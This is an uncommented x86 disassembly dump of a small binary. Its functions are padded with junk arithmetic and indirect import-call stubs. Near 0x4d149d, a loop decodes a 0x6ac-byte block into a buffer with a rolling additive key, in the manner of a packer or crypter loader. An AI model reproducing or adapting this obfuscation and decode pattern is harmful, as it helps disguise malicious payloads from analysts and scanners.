  4d10e5:	push   esi
  4d10e6:	push   DWORD PTR [esi+0x10]
  4d10e9:	push   eax
  4d10ea:	push   DWORD PTR [esi+0x1b8]
  4d10f0:	call   0x4d0a38
  4d10f5:	add    esp,0xc
  4d10f8:	pop    esi
  4d10f9:	mov    eax,0x0
  4d10fe:	push   eax
  4d10ff:	call   0x4d077c
  4d1104:	add    esp,0x4
  4d1107:	add    esp,0x5c
  4d110a:	pop    ebp
  4d110b:	ret    
  4d110c:	mov    edi,edi
  4d110e:	push   ebp
  4d110f:	mov    ebp,esp
  4d1111:	sub    esp,0x4c
  4d1114:	lea    ecx,ds:0x4d3024
  4d111a:	sbb    eax,ecx
  4d111c:	push   ecx
  4d111d:	push   DWORD PTR [ecx+0x88]
  4d1123:	push   DWORD PTR [ecx+0x124]
  4d1129:	call   0x4d0d08
  4d112e:	add    esp,0x8
  4d1131:	pop    ecx
  4d1132:	push   ecx
  4d1133:	lea    ecx,[ecx-0x24]
  4d1136:	push   ecx
  4d1137:	call   0x4d143c
  4d113c:	add    esp,0x4
  4d113f:	test   eax,eax
  4d1141:	jne    0x4d1133
  4d1143:	pop    ecx
  4d1144:	push   ecx
  4d1145:	mov    esi,0x0
  4d114a:	push   esi
  4d114b:	call   0x4d077c
  4d1150:	add    esp,0x4
  4d1153:	pop    ecx
  4d1154:	add    esp,0x4c
  4d1157:	pop    ebp
  4d1158:	ret    
  4d1159:	add    BYTE PTR [eax],al
  4d115b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1161:	sub    esp,0x60
  4d1164:	mov    ecx,0x4d30b0
  4d1169:	sbb    esi,edx
  4d116b:	push   ecx
  4d116c:	push   0x0
  4d116e:	call   0x4d07d8
  4d1173:	add    esp,0x4
  4d1176:	pop    ecx
  4d1177:	push   ecx
  4d1178:	push   ebx
  4d1179:	push   DWORD PTR [ecx+0x1b4]
  4d117f:	push   eax
  4d1180:	push   DWORD PTR [ecx+0x1ec]
  4d1186:	call   0x4d1248
  4d118b:	add    esp,0x10
  4d118e:	pop    ecx
  4d118f:	push   ecx
  4d1190:	call   0x4d0938
  4d1195:	add    esp,0x4
  4d1198:	pop    ecx
  4d1199:	add    esp,0x60
  4d119c:	pop    ebp
  4d119d:	ret    
  4d119e:	add    BYTE PTR [eax],al
  4d11a0:	mov    edi,edi
  4d11a2:	push   ebp
  4d11a3:	mov    ebp,esp
  4d11a5:	sub    esp,0x40
  4d11a8:	lea    edx,[edi+0x134]
  4d11ae:	or     edi,0xffffb111
  4d11b4:	push   edx
  4d11b5:	call   0x4d0938
  4d11ba:	add    esp,0x4
  4d11bd:	pop    edx
  4d11be:	push   edx
  4d11bf:	push   DWORD PTR [edx+0x18c]
  4d11c5:	push   ebx
  4d11c6:	push   DWORD PTR [edx+0x14c]
  4d11cc:	call   0x4d0d58
  4d11d1:	add    esp,0xc
  4d11d4:	pop    edx
  4d11d5:	push   edx
  4d11d6:	push   0x0
  4d11d8:	call   0x4d07d8
  4d11dd:	add    esp,0x4
  4d11e0:	pop    edx
  4d11e1:	add    esp,0x40
  4d11e4:	pop    ebp
  4d11e5:	ret    
  4d11e6:	add    BYTE PTR [eax],al
  4d11e8:	pop    edi
  4d11e9:	call   DWORD PTR ds:0x4d2044
  4d11ef:	call   edi
  4d11f1:	add    BYTE PTR [eax],al
  4d11f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11f9:	sub    esp,0x50
  4d11fc:	mov    edx,0x4d30d8
  4d1201:	mov    DWORD PTR [edx-0xd4],edx
  4d1207:	push   edx
  4d1208:	push   DWORD PTR [edx+0x1a0]
  4d120e:	push   DWORD PTR [edx+0x1e4]
  4d1214:	push   DWORD PTR [edx+0x94]
  4d121a:	push   ebx
  4d121b:	call   0x4d13ec
  4d1220:	add    esp,0x10
  4d1223:	pop    edx
  4d1224:	push   edx
  4d1225:	call   0x4d0938
  4d122a:	add    esp,0x4
  4d122d:	pop    edx
  4d122e:	push   edx
  4d122f:	lea    edx,[edx-0xd8]
  4d1235:	push   edx
  4d1236:	call   0x4d143c
  4d123b:	add    esp,0x4
  4d123e:	test   eax,eax
  4d1240:	jne    0x4d122f
  4d1242:	pop    edx
  4d1243:	add    esp,0x50
  4d1246:	pop    ebp
  4d1247:	ret    
  4d1248:	mov    edi,edi
  4d124a:	push   ebp
  4d124b:	mov    ebp,esp
  4d124d:	sub    esp,0x30
  4d1250:	lea    edx,ds:0x4d3170
  4d1256:	or     eax,DWORD PTR [ebp-0x14]
  4d1259:	push   edx
  4d125a:	mov    esi,0x0
  4d125f:	push   esi
  4d1260:	call   0x4d1340
  4d1265:	add    esp,0x4
  4d1268:	pop    edx
  4d1269:	push   edx
  4d126a:	push   edi
  4d126b:	push   esi
  4d126c:	call   0x4d0db0
  4d1271:	add    esp,0x8
  4d1274:	pop    edx
  4d1275:	push   edx
  4d1276:	mov    eax,0x0
  4d127b:	push   eax
  4d127c:	call   0x4d0bfc
  4d1281:	add    esp,0x4
  4d1284:	pop    edx
  4d1285:	add    esp,0x30
  4d1288:	pop    ebp
  4d1289:	ret    
  4d128a:	add    BYTE PTR [eax],al
  4d128c:	pop    edi
  4d128d:	call   DWORD PTR ds:0x4d204c
  4d1293:	call   edi
  4d1295:	add    BYTE PTR [eax],al
  4d1297:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d129d:	sub    esp,0x3c
  4d12a0:	lea    esi,[ecx-0xa8]
  4d12a6:	sbb    edi,DWORD PTR [ebp-0x2c]
  4d12a9:	push   esi
  4d12aa:	push   eax
  4d12ab:	push   DWORD PTR [esi+0xe4]
  4d12b1:	push   DWORD PTR [esi+0x144]
  4d12b7:	push   DWORD PTR [esi+0x108]
  4d12bd:	call   0x4d0b08
  4d12c2:	add    esp,0x10
  4d12c5:	pop    esi
  4d12c6:	call   0x4d0998
  4d12cb:	add    esp,0x4
  4d12ce:	push   0x0
  4d12d0:	call   0x4d07d8
  4d12d5:	add    esp,0x4
  4d12d8:	add    esp,0x3c
  4d12db:	pop    ebp
  4d12dc:	ret    
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [edi-0x1],bl
  4d12e2:	adc    eax,0x4d2040
  4d12e7:	call   edi
  4d12e9:	add    BYTE PTR [eax],al
  4d12eb:	add    BYTE PTR [edi-0x1],bl
  4d12ee:	adc    eax,0x4d207c
  4d12f3:	call   edi
  4d12f5:	add    BYTE PTR [eax],al
  4d12f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12fd:	sub    esp,0x28
  4d1300:	lea    ecx,ds:0x4d30b0
  4d1306:	mov    eax,edi
  4d1308:	push   ecx
  4d1309:	push   DWORD PTR [ecx+0x90]
  4d130f:	push   edi
  4d1310:	push   edx
  4d1311:	push   esi
  4d1312:	call   0x4d0890
  4d1317:	add    esp,0x10
  4d131a:	pop    ecx
  4d131b:	push   ecx
  4d131c:	mov    eax,0x0
  4d1321:	push   eax
  4d1322:	call   0x4d0f30
  4d1327:	add    esp,0x4
  4d132a:	pop    ecx
  4d132b:	push   ecx
  4d132c:	mov    esi,0x0
  4d1331:	push   esi
  4d1332:	call   0x4d1340
  4d1337:	add    esp,0x4
  4d133a:	pop    ecx
  4d133b:	add    esp,0x28
  4d133e:	pop    ebp
  4d133f:	ret    
  4d1340:	pop    edi
  4d1341:	call   DWORD PTR ds:0x4d2038
  4d1347:	call   edi
  4d1349:	add    BYTE PTR [eax],al
  4d134b:	add    BYTE PTR [edi-0x1],bl
  4d134e:	adc    eax,0x4d206c
  4d1353:	call   edi
  4d1355:	add    BYTE PTR [eax],al
  4d1357:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d135d:	sub    esp,0x5c
  4d1360:	lea    ecx,ds:0x4d31c4
  4d1366:	xor    DWORD PTR [ecx-0x5c],0xffffffc2
  4d136a:	push   ecx
  4d136b:	push   DWORD PTR [ecx+0xdc]
  4d1371:	push   ebx
  4d1372:	call   0x4d1298
  4d1377:	add    esp,0x8
  4d137a:	pop    ecx
  4d137b:	push   ecx
  4d137c:	mov    edx,0x0
  4d1381:	push   edx
  4d1382:	call   0x4d12e0
  4d1387:	add    esp,0x4
  4d138a:	pop    ecx
  4d138b:	push   ecx
  4d138c:	mov    ebx,0x0
  4d1391:	push   ebx
  4d1392:	call   0x4d07d8
  4d1397:	add    esp,0x4
  4d139a:	pop    ecx
  4d139b:	add    esp,0x5c
  4d139e:	pop    ebp
  4d139f:	ret    
  4d13a0:	mov    edi,edi
  4d13a2:	push   ebp
  4d13a3:	mov    ebp,esp
  4d13a5:	sub    esp,0x28
  4d13a8:	mov    ecx,0x4d318c
  4d13ad:	add    DWORD PTR [ebp-0x24],0x62bb
  4d13b4:	push   ecx
  4d13b5:	mov    ecx,0x0
  4d13ba:	push   ecx
  4d13bb:	call   0x4d092c
  4d13c0:	add    esp,0x4
  4d13c3:	pop    ecx
  4d13c4:	push   ecx
  4d13c5:	push   esi
  4d13c6:	push   edi
  4d13c7:	push   edx
  4d13c8:	push   esi
  4d13c9:	call   0x4d0e50
  4d13ce:	add    esp,0x10
  4d13d1:	pop    ecx
  4d13d2:	push   ecx
  4d13d3:	lea    edi,[ecx-0x18c]
  4d13d9:	push   edi
  4d13da:	call   0x4d143c
  4d13df:	add    esp,0x4
  4d13e2:	test   eax,eax
  4d13e4:	jne    0x4d13d3
  4d13e6:	pop    ecx
  4d13e7:	add    esp,0x28
  4d13ea:	pop    ebp
  4d13eb:	ret    
  4d13ec:	mov    edi,edi
  4d13ee:	push   ebp
  4d13ef:	mov    ebp,esp
  4d13f1:	sub    esp,0x28
  4d13f4:	mov    esi,0x4d31f8
  4d13f9:	and    DWORD PTR [esi-0x8c],edi
  4d13ff:	mov    ecx,0xfffffff4
  4d1404:	push   ecx
  4d1405:	call   0x4d0b9c
  4d140a:	add    esp,0x4
  4d140d:	push   esi
  4d140e:	push   DWORD PTR [esi+0x24]
  4d1411:	push   DWORD PTR [esi+0xd0]
  4d1417:	call   0x4d1498
  4d141c:	add    esp,0x8
  4d141f:	pop    esi
  4d1420:	push   0x0
  4d1422:	call   0x4d1340
  4d1427:	add    esp,0x4
  4d142a:	add    esp,0x28
  4d142d:	pop    ebp
  4d142e:	ret    
  4d142f:	add    BYTE PTR [edi-0x1],bl
  4d1432:	adc    eax,0x4d203c
  4d1437:	call   edi
  4d1439:	add    BYTE PTR [eax],al
  4d143b:	add    BYTE PTR [edi-0x1],bl
  4d143e:	adc    eax,0x4d2030
  4d1443:	call   edi
  4d1445:	add    BYTE PTR [eax],al
  4d1447:	add    BYTE PTR [edi-0x1],bl
  4d144a:	adc    eax,0x4d2060
  4d144f:	call   edi
  4d1451:	add    BYTE PTR [eax],al
  4d1453:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1459:	sub    esp,0x60
  4d145c:	mov    edi,0x4d308c
  4d1461:	sbb    DWORD PTR [edi-0x3c],0xffffffad
  4d1465:	push   edi
  4d1466:	push   0x0
  4d1468:	call   0x4d134c
  4d146d:	add    esp,0x4
  4d1470:	pop    edi
  4d1471:	push   edi
  4d1472:	push   edx
  4d1473:	push   edx
  4d1474:	call   0x4d0fbc
  4d1479:	add    esp,0x8
  4d147c:	pop    edi
  4d147d:	push   edi
  4d147e:	call   0x4d0da4
  4d1483:	add    esp,0x4
  4d1486:	pop    edi
  4d1487:	add    esp,0x60
  4d148a:	pop    ebp
  4d148b:	ret    
  4d148c:	pop    edi
  4d148d:	call   DWORD PTR ds:0x4d2088
  4d1493:	call   edi
  4d1495:	add    BYTE PTR [eax],al
  4d1497:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d149d:	sub    esp,0x54
  4d14a0:	xor    DWORD PTR [ebp-0x44],0x55
  4d14a4:	lea    ebx,ds:0x4d3068
  4d14aa:	mov    edx,0x6ac
  4d14af:	push   edx
  4d14b0:	push   0x6ac
  4d14b5:	mov    eax,0x40001
  4d14ba:	push   eax
  4d14bb:	mov    edx,0x862985c6
  4d14c0:	push   DWORD PTR [edx+0x7a239a86]
  4d14c6:	sub    DWORD PTR [esp],0x2
  4d14ca:	mov    edx,0x4d2028
  4d14cf:	pop    DWORD PTR [edx]
  4d14d1:	call   0x4d098c
  4d14d6:	add    esp,0x4
  4d14d9:	push   eax
  4d14da:	pop    DWORD PTR [ebx-0x28]
  4d14dd:	mov    ecx,DWORD PTR [ebx-0x28]
  4d14e0:	mov    edi,ecx
  4d14e2:	sub    eax,eax
  4d14e4:	dec    eax
  4d14e5:	and    eax,0x4d0014
  4d14ea:	mov    edx,0xd5d9a824
  4d14ef:	xor    esi,esi
  4d14f1:	cmp    esi,0x6ac
  4d14f7:	je     0x4d1515
  4d14f9:	sub    esi,0xfffffffc
  4d14fc:	xor    ecx,ecx
  4d14fe:	push   DWORD PTR [eax+ecx*1]
  4d1501:	add    DWORD PTR [esp],edx
  4d1504:	pop    DWORD PTR [edi+ecx*2]
  4d1507:	dec    DWORD PTR [edi]
  4d1509:	xor    edx,edx
  4d150b:	add    edx,DWORD PTR [eax]
  4d150d:	add    eax,0x4
  4d1510:	add    edi,0x4
  4d1513:	jmp    0x4d14f1
  4d1515:	mov    eax,0x0
  4d151a:	push   eax
  4d151b:	call   0x4d15dc
  4d1520:	add    esp,0x4
  4d1523:	add    esp,0x54
  4d1526:	pop    ebp
  4d1527:	ret    
  4d1528:	pop    edi
  4d1529:	call   DWORD PTR ds:0x4d2084
  4d152f:	call   edi
  4d1531:	add    BYTE PTR [eax],al
  4d1533:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1539:	sub    esp,0x40
  4d153c:	lea    edx,ds:0x4d3060
  4d1542:	or     ebx,DWORD PTR [ebp-0x28]
  4d1545:	push   edx
  4d1546:	push   0x0
  4d1548:	call   0x4d07d8
  4d154d:	add    esp,0x4
  4d1550:	pop    edx
  4d1551:	push   edx
  4d1552:	push   esi
  4d1553:	push   DWORD PTR [edx+0x7c]
  4d1556:	call   0x4d0a7c
  4d155b:	add    esp,0x8
  4d155e:	pop    edx
  4d155f:	push   edx
  4d1560:	mov    edx,0x0
  4d1565:	push   edx
  4d1566:	call   0x4d15dc
  4d156b:	add    esp,0x4
  4d156e:	pop    edx
  4d156f:	add    esp,0x40
  4d1572:	pop    ebp
  4d1573:	ret    
  4d1574:	mov    edi,edi
  4d1576:	push   ebp
  4d1577:	mov    ebp,esp
  4d1579:	sub    esp,0x60
  4d157c:	mov    edi,0x4d3010
  4d1581:	adc    DWORD PTR [edi+0x174],0xffff8534
  4d158b:	push   edi
  4d158c:	mov    ebx,0x0
  4d1591:	push   ebx
  4d1592:	call   0x4d1340
  4d1597:	add    esp,0x4
  4d159a:	pop    edi
  4d159b:	push   edi
  4d159c:	push   DWORD PTR [edi+0x150]
  4d15a2:	push   esi
  4d15a3:	push   DWORD PTR [edi+0x10]
  4d15a6:	call   0x4d11a0
  4d15ab:	add    esp,0xc
  4d15ae:	pop    edi
  4d15af:	push   edi
  4d15b0:	mov    edx,0x0
  4d15b5:	push   edx
  4d15b6:	call   0x4d11e8
  4d15bb:	add    esp,0x4
  4d15be:	pop    edi
  4d15bf:	add    esp,0x60
  4d15c2:	pop    ebp
  4d15c3:	ret    
  4d15c4:	pop    edi
  4d15c5:	call   DWORD PTR ds:0x4d2080
  4d15cb:	call   edi
  4d15cd:	add    BYTE PTR [eax],al
  4d15cf:	add    BYTE PTR [edi-0x1],bl
  4d15d2:	adc    eax,0x4d205c
  4d15d7:	call   edi
  4d15d9:	add    BYTE PTR [eax],al
  4d15db:	add    BYTE PTR [edi-0x1],bl
  4d15de:	adc    eax,0x4d2074
  4d15e3:	call   edi
  4d15e5:	add    BYTE PTR [eax],al
	...
